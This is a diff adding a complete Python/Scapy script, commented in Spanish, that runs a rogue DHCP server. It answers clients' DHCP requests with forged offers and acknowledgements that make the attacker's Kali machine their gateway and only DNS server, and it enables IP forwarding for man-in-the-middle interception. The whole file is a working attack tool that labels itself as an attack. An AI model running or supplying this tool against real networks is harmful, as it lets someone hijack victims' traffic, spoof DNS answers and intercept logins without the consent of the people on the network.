@@ -1,0 +1,158 @@
+#!/usr/bin/env python3
+from scapy.all import *
+import sys
+import time
+
+# Configuración del ataque
+IFACE = "eth0"
+SERVER_IP = "20.24.116.2"
+SUBNET_MASK = "255.255.255.0"
+GATEWAY = "20.24.116.2"
+DNS_SERVER = "20.24.116.2"  # SOLO TU KALI
+LEASE_TIME = 43200
+
+IP_POOL_START = 100
+IP_POOL_END = 200
+IP_BASE = "20.24.116."
+
+assigned_ips = {}
+current_ip = IP_POOL_START
+
+def get_next_ip():
+    global current_ip
+    if current_ip > IP_POOL_END:
+        current_ip = IP_POOL_START
+    ip = IP_BASE + str(current_ip)
+    current_ip += 1
+    return ip
+
+def dhcp_offer(packet):
+    global assigned_ips
+    
+    client_mac = packet[Ether].src
+    xid = packet[BOOTP].xid
+    
+    if client_mac in assigned_ips:
+        offered_ip = assigned_ips[client_mac]
+    else:
+        offered_ip = get_next_ip()
+        assigned_ips[client_mac] = offered_ip
+    
+    print(f"\n[OFFER] Ofreciendo IP {offered_ip} a {client_mac}")
+    
+    ether = Ether(src=get_if_hwaddr(IFACE), dst=client_mac)
+    ip = IP(src=SERVER_IP, dst="255.255.255.255")
+    udp = UDP(sport=67, dport=68)
+    bootp = BOOTP(
+        op=2,
+        xid=xid,
+        yiaddr=offered_ip,
+        siaddr=SERVER_IP,
+        chaddr=mac2str(client_mac)
+    )
+    
+    # CRÍTICO: Solo un DNS (tu Kali)
+    dhcp = DHCP(options=[
+        ("message-type", "offer"),
+        ("server_id", SERVER_IP),
+        ("lease_time", LEASE_TIME),
+        ("subnet_mask", SUBNET_MASK),
+        ("router", GATEWAY),
+        ("name_server", DNS_SERVER),  # SOLO UNO
+        "end"
+    ])
+    
+    offer_packet = ether / ip / udp / bootp / dhcp
+    sendp(offer_packet, iface=IFACE, verbose=0)
+    print(f"[✓] DHCP OFFER enviado - DNS: {DNS_SERVER}")
+
+def dhcp_ack(packet):
+    global assigned_ips
+    
+    client_mac = packet[Ether].src
+    xid = packet[BOOTP].xid
+    
+    requested_ip = assigned_ips.get(client_mac, get_next_ip())
+    
+    print(f"\n[ACK] Confirmando IP {requested_ip} a {client_mac}")
+    
+    ether = Ether(src=get_if_hwaddr(IFACE), dst=client_mac)
+    ip = IP(src=SERVER_IP, dst="255.255.255.255")
+    udp = UDP(sport=67, dport=68)
+    bootp = BOOTP(
+        op=2,
+        xid=xid,
+        yiaddr=requested_ip,
+        siaddr=SERVER_IP,
+        chaddr=mac2str(client_mac)
+    )
+    
+    # CRÍTICO: Solo un DNS (tu Kali)
+    dhcp = DHCP(options=[
+        ("message-type", "ack"),
+        ("server_id", SERVER_IP),
+        ("lease_time", LEASE_TIME),
+        ("subnet_mask", SUBNET_MASK),
+        ("router", GATEWAY),
+        ("name_server", DNS_SERVER),  # SOLO UNO
+        "end"
+    ])
+    
+    ack_packet = ether / ip / udp / bootp / dhcp
+    sendp(ack_packet, iface=IFACE, verbose=0)
+    print(f"[✓] DHCP ACK enviado")
+    print(f"[✓✓] IP: {requested_ip}")
+    print(f"[✓✓] Gateway: {GATEWAY}")
+    print(f"[✓✓] DNS: {DNS_SERVER} ← SOLO TU KALI")
+
+def dhcp_handler(packet):
+    if DHCP in packet:
+        dhcp_message_type = None
+        for opt in packet[DHCP].options:
+            if isinstance(opt, tuple) and opt[0] == "message-type":
+                dhcp_message_type = opt[1]
+                break
+        
+        if dhcp_message_type == 1:
+            print(f"\n{'='*60}")
+            print(f"[DISCOVER] Recibido de {packet[Ether].src}")
+            dhcp_offer(packet)
+            
+        elif dhcp_message_type == 3:
+            print(f"\n{'='*60}")
+            print(f"[REQUEST] Recibido de {packet[Ether].src}")
+            dhcp_ack(packet)
+
+def main():
+    print("""
+╔══════════════════════════════════════════════════════════╗
+║          DHCP ROGUE SERVER - SCAPY v2                    ║
+║          DNS Forzado: SOLO Kali                          ║
+╚══════════════════════════════════════════════════════════╝
+    """)
+    
+    print(f"[+] Interfaz: {IFACE}")
+    print(f"[+] IP del servidor DHCP falso: {SERVER_IP}")
+    print(f"[+] Gateway falso: {GATEWAY}")
+    print(f"[+] DNS falso: {DNS_SERVER} ← ÚNICO DNS")
+    print(f"[+] Pool de IPs: {IP_BASE}{IP_POOL_START} - {IP_BASE}{IP_POOL_END}")
+    print("\n[*] Esperando solicitudes DHCP...\n")
+    
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    
+    filter_str = "udp and (port 67 or port 68)"
+    
+    try:
+        sniff(iface=IFACE, filter=filter_str, prn=dhcp_handler, store=0)
+    except KeyboardInterrupt:
+        print("\n\n[!] Ataque detenido")
+        print(f"[+] Total de IPs asignadas: {len(assigned_ips)}")
+        for mac, ip in assigned_ips.items():
+            print(f"    {mac} -> {ip}")
+        sys.exit(0)
+
+if __name__ == "__main__":
+    if os.geteuid() != 0:
+        print("[!] Este script debe ejecutarse como root")
+        sys.exit(1)
+    main()
